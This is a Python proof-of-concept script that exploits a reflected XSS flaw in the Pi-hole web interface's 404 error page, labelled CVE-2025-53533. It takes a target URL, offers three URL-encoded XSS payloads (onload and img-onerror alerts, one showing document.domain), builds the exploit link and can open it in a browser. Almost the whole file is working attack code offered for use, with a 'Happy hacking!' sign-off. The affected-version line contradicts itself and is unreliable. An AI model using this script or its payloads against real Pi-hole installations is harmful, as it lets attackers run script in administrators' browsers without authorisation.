#!/usr/bin/env python3
"""
Reflected Cross-Site Scripting (XSS) in Pi-hole Web Interface (CVE-2025-53533)
Unauthenticated XSS in 404 error page - Payload automatically executes when page loads
Affected versions 6.2.1 => 
"""

import urllib.parse
import webbrowser

# Color codes
GREEN = '\033[92m'
RED = '\033[91m'
BOLD = '\033[1m'
RESET = '\033[0m'

def main():
    # Print the full header information
    print(f"{GREEN}Reflected Cross-Site Scripting (XSS) in Pi-hole Web Interface (CVE-2025-53533){RESET}")
    print(f"{GREEN}Unauthenticated XSS in 404 error page - Payload automatically executes when page loads{RESET}")
    print(f"{GREEN}Affected versions: => 6.2.1{RESET}")
    print()
    
    target = input(f"{GREEN}Enter Pi-hole URL (e.g. http://192.168.1.1:85, https://pi-hole.home.local): {RESET}").strip()
    
    # Payloads
    payloads = {
        '1': '%22onload=alert(1);%3E',
        '2': '%22%3e%3cimg%20src%3da%20onerror%3dalert(document.domain)%3e',
        '3': '%22onload=alert(`The-Best-Internet-Pi-Hole`);%3E'
    }
    
    print(f"{BOLD}{RED}\n[+] Select payload:{RESET}")
    print(f"{GREEN}1 - Basic alert(1) : %22onload=alert(1);%3E{RESET}")
    print(f"{GREEN}2 - Alert with domain : %22%3e%3cimg%20src%3da%20onerror%3dalert(document.domain)%3e{RESET}")
    print(f"{GREEN}3 - The-Best-Internet-Pi-Hole : %22onload=alert(`The-Best-Internet-Pi-Hole`);%3E{RESET}")
    
    choice = input(f"{BOLD}Choice (1-3): {RESET}").strip() or '1'
    payload = payloads.get(choice, payloads['1'])
    
    # Build exploit URL
    exploit_url = f"{target}/{payload}"
    
    print(f"{BOLD}{RED}\n[+] Exploit URL:{RESET}")
    print(f"{BOLD}{GREEN}{exploit_url}{RESET}")
    
    if input(f"{BOLD}{RED}\n[+] Open in browser? (y/n): {RESET}").lower() == 'y':
        webbrowser.open(exploit_url)
    
    print(f"{GREEN}\n" + "="*59)
    print("Happy hacking! May your Pi-hole block all the internet ads!")
    print("="*59 + f"{RESET}")

if __name__ == "__main__":
    main()
